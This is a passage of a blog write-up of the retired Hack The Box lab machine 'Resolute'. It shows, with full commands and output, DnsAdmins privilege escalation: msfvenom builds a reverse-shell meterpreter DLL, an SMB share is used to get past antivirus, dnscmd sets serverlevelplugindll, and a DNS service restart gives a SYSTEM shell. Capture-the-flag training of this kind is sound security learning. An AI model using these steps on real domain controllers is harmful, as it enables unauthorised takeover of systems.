+</span><span class="nf">Mandatory</span><span class="w"> </span><span class="nx">Label\Medium</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w">     </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-8192</span><span class="w">
+
+
+</span><span class="nf">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">----------------------</span><span class="w">
+
+</span><span class="nf">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
+</span><span class="nf">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="nf">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+
+
+</span><span class="nf">USER</span><span class="w"> </span><span class="nx">CLAIMS</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">-----------------------</span><span class="w">
+
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">claims</span><span class="w"> </span><span class="nx">unknown.</span><span class="w">
+
+</span><span class="nf">Kerberos</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Dynamic</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">disabled.</span><span class="w">
+                                                            
+</span></pre></table></code></div></div><p>From the line we can conclude that the user <strong>ryan</strong> is in <code class="language-plaintext highlighter-rouge">dnsadmin</code> group</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>MEGABANK<span class="se">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+</pre></table></code></div></div><p>From now i have something o which i can <code class="language-plaintext highlighter-rouge">focus</code> , I got a article after some <strong>research</strong></p><blockquote><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></p></blockquote><p>Now i created a malicious <code class="language-plaintext highlighter-rouge">dll</code> file using <strong>msfvenom</strong> which will give me a meterpreter shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  prashant msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.4 <span class="nv">LPORT</span><span class="o">=</span>5678 <span class="nt">-f</span> dll <span class="o">&gt;</span> saini.dll
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes
+</pre></table></code></div></div><p>And now i moved the <code class="language-plaintext highlighter-rouge">saini.dll</code> to the machine using <strong>iwr</strong></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.14.4/saini.dll</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">saini.dll</span><span class="w">
+</span></pre></table></code></div></div><p>And its bees downloaded</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
+
+
+    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="w">
+
+
+</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
+</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">5</span><span class="nf">/29/2020</span><span class="w">  </span><span class="nx">10:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">5120</span><span class="w"> </span><span class="nx">saini.dll</span><span class="w">
+</span></pre></table></code></div></div><p>But doing <code class="language-plaintext highlighter-rouge">ls</code> another time the <strong>dll</strong> file is gone . So i can <code class="language-plaintext highlighter-rouge">confirm</code> that <strong>Anti - Virus</strong> is running or <strong>Real - time Protection</strong> .</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><blockquote><p>I will be using smb service to get rid of <code class="language-plaintext highlighter-rouge">AV</code> that is also mentioned in the article</p></blockquote><p>So i used <code class="language-plaintext highlighter-rouge">impacket</code> <strong>smbserver.py</strong> for a quick setup of my smb service</p><p>And started smbserver to <strong>bypass</strong> the av <strong>protection</strong> on the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>➜  prashant python /usr/share/doc/python-impacket/examples/smbserver.py <span class="nt">-smb2support</span> public <span class="nb">.</span>     
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</pre></table></code></div></div><h2 id="hack---steps">Hack - Steps</h2><p>What i am going to do is setting the <code class="language-plaintext highlighter-rouge">serverlevelplugindll</code> to my malicious <strong>dll</strong> .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>dnscmd  /config /serverlevelplugindll <span class="se">\\</span>10.10.14.4<span class="se">\p</span>ublic<span class="se">\s</span>aini.dll
+</pre></table></code></div></div><p>And Then i need to <code class="language-plaintext highlighter-rouge">stop</code> the service <strong>dns</strong> and then <code class="language-plaintext highlighter-rouge">start</code> it again so that when the <code class="language-plaintext highlighter-rouge">service</code> start again the dns <strong>service</strong> will look for the <strong>serverplugin</strong> and since we have set that <code class="language-plaintext highlighter-rouge">plugin</code> to my <strong>dll</strong> file , So it will execute my file and we will get a shell for sure.</p><blockquote><p>Setting the serverlevelplugindll to my file</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dnscmd</span><span class="w">  </span><span class="nx">/config</span><span class="w"> </span><span class="nx">/serverlevelplugindll</span><span class="w"> </span><span class="nx">\\10.10.14.4\public\saini.dll</span><span class="w">
+
+</span><span class="nf">Registry</span><span class="w"> </span><span class="nx">property</span><span class="w"> </span><span class="nx">serverlevelplugindll</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">reset.</span><span class="w">
+</span><span class="kr">Command</span><span class="w"> </span><span class="nf">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><blockquote><p>Stopping the service</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">dns</span><span class="w">
+
+</span><span class="nf">SERVICE_NAME:</span><span class="w"> </span><span class="nx">dns</span><span class="w">
+        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="nf">WIN32_OWN_PROCESS</span><span class="w">
+        </span><span class="nx">STATE</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">3</span><span class="w">  </span><span class="nx">STOP_PENDING</span><span class="w">
+                                </span><span class="p">(</span><span class="nf">STOPPABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">PAUSABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">ACCEPTS_SHUTDOWN</span><span class="p">)</span><span class="w">
+        </span><span class="nf">WIN32_EXIT_CODE</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
+        </span><span class="nf">SERVICE_EXIT_CODE</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
+        </span><span class="nf">CHECKPOINT</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0x0</span><span class="w">
+        </span><span class="nf">WAIT_HINT</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">0x0</span><span class="w">
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><blockquote><p>Starting the service</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">dns</span><span class="w">
+
+</span><span class="nf">SERVICE_NAME:</span><span class="w"> </span><span class="nx">dns</span><span class="w">
+        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="nf">WIN32_OWN_PROCESS</span><span class="w">
+        </span><span class="nx">STATE</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">  </span><span class="nx">START_PENDING</span><span class="w">
+                                </span><span class="p">(</span><span class="nf">NOT_STOPPABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">NOT_PAUSABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">IGNORES_SHUTDOWN</span><span class="p">)</span><span class="w">
+        </span><span class="nf">WIN32_EXIT_CODE</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
+        </span><span class="nf">SERVICE_EXIT_CODE</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
+        </span><span class="nf">CHECKPOINT</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0x0</span><span class="w">
+        </span><span class="nf">WAIT_HINT</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">0x7d0</span><span class="w">
+        </span><span class="nf">PID</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">3948</span><span class="w">
+        </span><span class="nf">FLAGS</span><span class="w">              </span><span class="p">:</span><span class="w">
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><blockquote><p>Got a <code class="language-plaintext highlighter-rouge">meterpreter</code> shell</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.4:5678 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>206403 bytes<span class="o">)</span> to 10.10.10.169
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 3 opened <span class="o">(</span>10.10.14.4:5678 -&gt; 10.10.10.169:60148<span class="o">)</span> at 2020-05-30 11:20:31 <span class="nt">-0400</span>
+
+meterpreter <span class="o">&gt;</span> 
+</pre></table></code></div></div><h1 id="got-shell-as-administrator">Got shell as administrator</h1><p><strong>Better if we just spawn a shell</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> shell
+Process 1908 created.
+Channel 1 created.
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami 
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</pre></table></code></div></div><h2 id="got-roottxt">Got root.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nf">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="nf">root.txt</span><span class="w">
+</span><span class="nx">e1d---------------------------19c</span><span class="w">
+</span></pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>Dnsadmin Priv esc<td><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/enum4linux/" class="post-tag no-text-decoration" >enum4linux</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >evil-winrm</a> <a href="/tags/dll-injection/" class="post-tag no-text-decoration" >dll-injection</a> <a href="/tags/dnsadmin/" class="post-tag no-text-decoration" >dnsadmin</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Resolute writeup - 0xPrashant&url=http://localhost:4000/posts/hackthebox-resolute/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Resolute writeup - 0xPrashant&u=http://localhost:4000/posts/hackthebox-resolute/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Resolute writeup - 0xPrashant&url=http://localhost:4000/posts/hackthebox-resolute/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/htb-traverxec/" class="btn btn-outline-primary"><p>Hackthebox Traverxec writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/hackthebox-resolute/'; this.page.identifier = '/posts/hackthebox-resolute/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
